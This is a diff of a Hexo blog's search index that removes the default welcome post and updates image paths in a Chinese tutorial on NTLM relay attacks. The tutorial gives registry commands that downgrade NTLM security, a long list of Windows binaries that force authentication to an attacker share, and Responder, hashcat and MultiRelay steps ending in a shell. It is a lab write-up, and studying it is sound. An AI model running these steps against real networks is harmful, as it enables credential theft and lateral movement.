@@ -1,24 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/posts/16107.html</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
     <title>NTLM-Relay攻击</title>
     <url>/posts/48087.html</url>
     <content><![CDATA[<h1 id="NTML-Relay前置知识"><a href="#NTML-Relay前置知识" class="headerlink" title="NTML-Relay前置知识"></a>NTML-Relay前置知识</h1><h2 id="什么是NTML协议"><a href="#什么是NTML协议" class="headerlink" title="什么是NTML协议"></a>什么是NTML协议</h2><p>NTLM（New Technology LAN Manager）协议是微软提供的一种安全协议，用于在Windows环境中进行身份验证。它基于质询响应机制，允许用户向服务器证明自己的身份，以便使用服务器提供的服务。NTLM协议的认证过程分为三个步骤：协商、质询和验证。在工作组环境中，用户使用服务器的本地账户进行认证；而在域环境中，用户使用域账户进行认证，服务器需要与域控制器交互来完成认证。NTLM协议虽然不直接传输密码，但使用了密码的哈希值NTLM Hash来进行身份验证。</p>
@@ -66,7 +48,7 @@
 <p> <strong>自Windows Vista&#x2F;Server2008开始起，微软默认使用Net-NTLMv2协议，想要降级到Net-NTLMv1，首先需要获得当前系统的管理员权限。2008 win7 及以上都是用了v2协议。2000 xp使用v1协议认证。</strong></p>
 <p>将系统的v2修改成v1</p>
 <p>(1)一条命令临时修改(适用：2008、2012、win7)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 0 /f</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
 
 <p>(2)这种方法亦可，区别在于确保Net-NTLMv1开启成功</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 2 /f</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v NtlmMinClientSec /t REG_DWORD /d 536870912 /f</span><br><span class="line">reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\MSV1_0\ /v RestrictSendingNTLMTraffic /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
@@ -82,35 +64,43 @@
 </ol>
 <p>如果没有在1、2项中找到对应名称，系统就会通过链路本地多播名称解析（LLMNR）和Net-BIOS名称服务（NBT-NS）在本地进行名称解析。这时，客户端就会将未经认证的UDP广播到网络中，询问它是否为本地系统的名称，由于该过程未被认证，并且广播到整个网络，从而允许网络上的任何机器响应并声称是这台机器。</p>
 <p>因此当用户输入不存在、包含错误或者DNS中 没有的主机名时，通过Responder工具监听LLMNR和NetBIOS广播，就可以伪装成受害者要访问的这台机器，并从而让受害者交出相应的登陆凭证。核心过程与arp欺骗类似，我们可以让攻击者作中间人，截获到客户端的Net-NTLM Hash。</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/652d27f3-9ac2-4d4d-8758-6bb0d92ea543.png" alt="652d27f3-9ac2-4d4d-8758-6bb0d92ea543"></p>
+<img src="/posts/48087/652d27f3-9ac2-4d4d-8758-6bb0d92ea543.png" class="" alt="652d27f3-9ac2-4d4d-8758-6bb0d92ea543">
+
 <p>本地和缓存查询不到sfss时，内网主机就会将未经认证的UDP广播到网络中，询问谁是sfss，由于该过程未被认证，并且广播到整个网络，从而允许网络 上的任何机器响应并声称自己是sfss。此时kali伪装成sfss这台机器，接着进行ntlm认证。从而让受害者交出相应的登陆凭证(Net-NTLMhash)</p>
 <p>触发NTLM认证的命令，这里大多数用的SMB通信协议</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net.exe use \\host\share</span><br><span class="line">attrib.exe \\host\share</span><br><span class="line">bcdboot.exe \\host\share</span><br><span class="line">bdeunlock.exe \\host\share</span><br><span class="line">cacls.exe \\host\share</span><br><span class="line">certreq.exe \\host\share #(noisy, pops an error dialog)</span><br><span class="line">certutil.exe \\host\share</span><br><span class="line">cipher.exe \\host\share</span><br><span class="line">ClipUp.exe -l \\host\share</span><br><span class="line">cmdl32.exe \\host\share</span><br><span class="line">cmstp.exe /s \\host\share</span><br><span class="line">colorcpl.exe \\host\share #(noisy, pops an error dialog)</span><br><span class="line">comp.exe /N=0 \\host\share \\host\share</span><br><span class="line">compact.exe \\host\share</span><br><span class="line">control.exe \\host\share</span><br><span class="line">convertvhd.exe -source \\host\share -destination \\host\share</span><br><span class="line">Defrag.exe \\host\share</span><br><span class="line">DeployUtil.exe /install \\host\share</span><br><span class="line">DevToolsLauncher.exe GetFileListing \\host\share #(this one&#x27;s cool. will return a file listing (json-formatted) from remote SMB share...)</span><br><span class="line">diskperf.exe \\host\share</span><br><span class="line">dispdiag.exe -out \\host\share</span><br><span class="line">doskey.exe /MACROFILE=\\host\share</span><br><span class="line">esentutl.exe /k \\host\share</span><br><span class="line">expand.exe \\host\share</span><br><span class="line">extrac32.exe \\host\share</span><br><span class="line">FileHistory.exe \\host\share #(noisy, pops a gui)</span><br><span class="line">findstr.exe * \\host\share</span><br><span class="line">fontview.exe \\host\share #(noisy, pops an error dialog)</span><br><span class="line">fvenotify.exe \\host\share #(noisy, pops an access denied error)</span><br><span class="line">FXSCOVER.exe \\host\share #(noisy, pops GUI)</span><br><span class="line">hwrcomp.exe -check \\host\share</span><br><span class="line">hwrreg.exe \\host\share</span><br><span class="line">icacls.exe \\host\share</span><br><span class="line">LaunchWinApp.exe \\host\share #(noisy, will pop an explorer window with the  contents of your SMB share.)</span><br><span class="line">licensingdiag.exe -cab \\host\share</span><br><span class="line">lodctr.exe \\host\share</span><br><span class="line">lpksetup.exe /p \\host\share /s</span><br><span class="line">makecab.exe \\host\share</span><br><span class="line">MdmDiagnosticsTool.exe -out \\host\share #(sends hash, and as a *bonus!* writes an MDMDiagReport.html to the attacker share with full CSP configuration.)</span><br><span class="line">mshta.exe \\host\share #(noisy, pops an HTA window)</span><br><span class="line">msiexec.exe /update \\host\share /quiet</span><br><span class="line">msinfo32.exe \\host\share #(noisy, pops a &quot;cannot open&quot; dialog)</span><br><span class="line">mspaint.exe \\host\share #(noisy, invalid path to png error)</span><br><span class="line">mspaint.exe \\host\share\share.png #(will capture hash, and display the remote PNG file to the user)</span><br><span class="line">msra.exe /openfile \\host\share #(noisy, error)</span><br><span class="line">mstsc.exe \\host\share #(noisy, error)</span><br><span class="line">netcfg.exe -l \\host\share -c p -i foo</span><br></pre></td></tr></table></figure>
 
 <h2 id="Net-NTLM-Relay攻击"><a href="#Net-NTLM-Relay攻击" class="headerlink" title="Net-NTLM Relay攻击"></a>Net-NTLM Relay攻击</h2><h3 id="暴力破解明文密码"><a href="#暴力破解明文密码" class="headerlink" title="暴力破解明文密码"></a>暴力破解明文密码</h3><p>首先攻击机利用kali工具(responder)进行监听</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/1d4a5629-9657-4f14-a8d9-efe2883ad68d.png" alt="1d4a5629-9657-4f14-a8d9-efe2883ad68d"></p>
+<img src="/posts/48087/1d4a5629-9657-4f14-a8d9-efe2883ad68d.png" class="" alt="1d4a5629-9657-4f14-a8d9-efe2883ad68d">
+
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">responder -I eth0 -v   //-I是指定网卡  -v是开启详细模式</span><br></pre></td></tr></table></figure>
 
 <p>受害者机器输入不能被解析的路径</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/dbad0bb0-a36a-45e3-b7fb-4612f9ccba8b.png" alt="dbad0bb0-a36a-45e3-b7fb-4612f9ccba8b"></p>
+<img src="/posts/48087/dbad0bb0-a36a-45e3-b7fb-4612f9ccba8b.png" class="" alt="dbad0bb0-a36a-45e3-b7fb-4612f9ccba8b">
+
 <p>监听到了这台机器的NTLM v2 凭证，这个v2凭证不能用来PTH，但是可以通过这个配合字典来破解出administrator的明文密码，可以通过hashcat来进行破解</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/24862e23-9427-4d5a-bafa-f988dc8b949e.png" alt="24862e23-9427-4d5a-bafa-f988dc8b949e"></p>
+<img src="/posts/48087/24862e23-9427-4d5a-bafa-f988dc8b949e.png" class="" alt="24862e23-9427-4d5a-bafa-f988dc8b949e">
+
 <p>保存下这个hash使用工具nth进行识别</p>
 <p>nth工具安装</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install name-that-hash </span><br></pre></td></tr></table></figure>
 
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/d244b8d8-375e-4d8a-9525-0d093188db56.png" alt="d244b8d8-375e-4d8a-9525-0d093188db56"></p>
+<img src="/posts/48087/d244b8d8-375e-4d8a-9525-0d093188db56.png" class="" alt="d244b8d8-375e-4d8a-9525-0d093188db56">
+
 <p>可以看到识别到5600，接下来就可以使用hashcat进行爆破</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/c9b99bd0-aa92-4241-97e1-3a5c94b464f0.png" alt="c9b99bd0-aa92-4241-97e1-3a5c94b464f0"></p>
+<img src="/posts/48087/c9b99bd0-aa92-4241-97e1-3a5c94b464f0.png" class="" alt="c9b99bd0-aa92-4241-97e1-3a5c94b464f0">
+
 <p>可以看到已经成功爆破出明文密码 (使用john也能爆破出来)</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/d049a38e-2f03-487b-af5a-63dc59f24084.png" alt="d049a38e-2f03-487b-af5a-63dc59f24084"></p>
+<img src="/posts/48087/d049a38e-2f03-487b-af5a-63dc59f24084.png" class="" alt="d049a38e-2f03-487b-af5a-63dc59f24084">
+
 <p>当然攻击芝士很多 </p>
 <p>详细的可以看这篇文章</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/193493</span><br></pre></td></tr></table></figure>
 
 <p><a href="https://www.anquanke.com/post/id/193493#h2-17">Windows内网协议学习NTLM篇之发起NTLM请求-安全客 - 安全资讯平台</a></p>
 <h3 id="NTLM重放攻击"><a href="#NTLM重放攻击" class="headerlink" title="NTLM重放攻击"></a>NTLM重放攻击</h3><p>利用场景如 在获取了高权限域内Net-NTLM Hash后对密码进行了爆破，如果爆破不出来  这时，就可以使用NTLM重放攻击进行域内横向移动</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/b7c87ff8-5929-4503-a976-ed94bbbb550b.png" alt="b7c87ff8-5929-4503-a976-ed94bbbb550b"></p>
+<img src="/posts/48087/b7c87ff8-5929-4503-a976-ed94bbbb550b.png" class="" alt="b7c87ff8-5929-4503-a976-ed94bbbb550b">
+
 <p>重放本身的含义就是：攻击者利用网络监听或者其他方式盗取认证凭据，之后再把它重新发给认证服务器。</p>
 <p>因此NTLM重放攻击也就是将窃听到的客户端Net-NTLM hash，重放到服务端。而由于攻击者拥有了该凭证，因此服务端自然而然就认为攻击者就是客户端。如果这个凭据权限足够，那么就可以控制域内其它主机，所以凭据的权限很重要。这里攻击者其实就充当了一个中间人的身份。</p>
 <p><strong>攻击前提</strong></p>
@@ -150,21 +140,26 @@
 <p>2.修改responder的配置文件Responder.conf，不让其对 hash 进行抓取。将SMB和HTTP的On改为Off：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /usr/share/responder/Responder.conf</span><br></pre></td></tr></table></figure>
 
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/221b64f7-0844-4309-b6f8-8b1d69cff405.png" alt="221b64f7-0844-4309-b6f8-8b1d69cff405"></p>
+<img src="/posts/48087/221b64f7-0844-4309-b6f8-8b1d69cff405.png" class="" alt="221b64f7-0844-4309-b6f8-8b1d69cff405">
+
 <p>3.先开启responder进行监听</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/effa06c9-ff13-430d-a8ba-d3477eb849cd.png" alt="effa06c9-ff13-430d-a8ba-d3477eb849cd"></p>
+<img src="/posts/48087/effa06c9-ff13-430d-a8ba-d3477eb849cd.png" class="" alt="effa06c9-ff13-430d-a8ba-d3477eb849cd">
+
 <p>4.启动MultiRelay.py（MultiRelay.py工具在responder&#x2F;tools&#x2F;下）</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/2fd56f7e-e263-458a-8ce1-73586be8f8fe.png" alt="2fd56f7e-e263-458a-8ce1-73586be8f8fe"></p>
+<img src="/posts/48087/2fd56f7e-e263-458a-8ce1-73586be8f8fe.png" class="" alt="2fd56f7e-e263-458a-8ce1-73586be8f8fe">
+
 <p>5.利用高权限域内主机进行广播</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/cc396094-dd60-4b50-a5eb-b0697ffc2614.png" alt="cc396094-dd60-4b50-a5eb-b0697ffc2614"></p>
+<img src="/posts/48087/cc396094-dd60-4b50-a5eb-b0697ffc2614.png" class="" alt="cc396094-dd60-4b50-a5eb-b0697ffc2614">
+
 <p>（这里的net use \\dsadasda  随便写一个不存在的就行 传递一个SMB流量）</p>
 <p>6.返回了win7的shell 攻击成功</p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/af425d19-e3e0-46f2-aa45-2b2c62805f16.png" alt="af425d19-e3e0-46f2-aa45-2b2c62805f16"></p>
-<p><img src="file:///C:/Users/%E9%99%88%E5%A5%87%E5%AE%87/Pictures/Typedown/7ceea99c-71f5-44c4-bcf4-e86b1b108004.png" alt="7ceea99c-71f5-44c4-bcf4-e86b1b108004"></p>
+<img src="/posts/48087/af425d19-e3e0-46f2-aa45-2b2c62805f16.png" class="" alt="af425d19-e3e0-46f2-aa45-2b2c62805f16">
+
+<img src="/posts/48087/7ceea99c-71f5-44c4-bcf4-e86b1b108004.png" class="" alt="7ceea99c-71f5-44c4-bcf4-e86b1b108004">
+
 <p>并且是高权限 实验完成  (Impacket中的smbrelayx.py也能做到)</p>
 <p><strong>参考</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.anquanke.com/post/id/193493</span><br><span class="line">https://xz.aliyun.com/t/8562?time__1311=n4%2BxnD0DcDuD907DCiD%2Fje0%3DeitePvh4x4%2BWPhD</span><br><span class="line">https://www.freebuf.com/articles/network/244375.html</span><br><span class="line">https://blog.csdn.net/weixin_54902210/article/details/128340465</span><br></pre></td></tr></table></figure>
-
 
 ]]></content>
   </entry>
